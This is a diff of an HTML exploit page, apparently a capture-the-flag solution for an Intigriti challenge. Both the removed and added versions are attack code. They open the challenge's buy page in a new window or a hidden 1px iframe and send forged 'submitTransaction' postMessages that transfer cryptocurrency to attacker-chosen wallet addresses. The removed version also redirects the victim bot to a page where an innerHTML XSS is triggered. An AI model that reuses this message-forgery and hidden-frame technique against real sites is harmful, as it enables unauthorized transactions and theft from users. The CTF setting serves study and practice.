@@ -1,37 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Exploit</title>
-</head>
 <body>
-    <h1>Processing Transaction...</h1>
-    <script>
-        // 1. Open the vulnerable buy page
-        // We use BTC because 1337COIN was reported as locked
-        const targetUrl = "https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1";
-        const botWin = window.open(targetUrl);
+<h1>Loading…</h1>
 
-        setTimeout(() => {
-            // 2. Exploit the postMessage vulnerability
-            // We send the transaction to the Admin's wallet address
-            console.log("Sending exploit message...");
-            botWin.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: '1647db76b716157f954c706f74641a756f',
-                    currency: 'BTC',
-                    amount: 0.000001
-                }
-            }, '*');
+<iframe
+  id="victim"
+  src="https://challenge-0126.intigriti.io/buy-confirm.html?currency=1337COIN&price=1"
+  style="width:1px;height:1px;border:0;"
+></iframe>
 
-            // 3. Follow the Trail: Redirect the bot to the Market Watch page
-            // This is where the nickname is rendered via .innerHTML
-            setTimeout(() => {
-                console.log("Redirecting to trigger XSS...");
-                botWin.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
-            }, 3000);
-            
-        }, 5000); // Give the page 5 seconds to fully load and fetch wallets
-    </script>
+<script>
+const iframe = document.getElementById("victim");
+
+iframe.onload = () => {
+  iframe.contentWindow.postMessage({
+    type: "submitTransaction",
+    transaction: {
+      toAddress: "1717144fb3f8905b8c70d07955a27dbc47",
+      currency: "1337COIN",
+      amount: 1
+    }
+  }, "*");
+};
+</script>
 </body>
 </html>
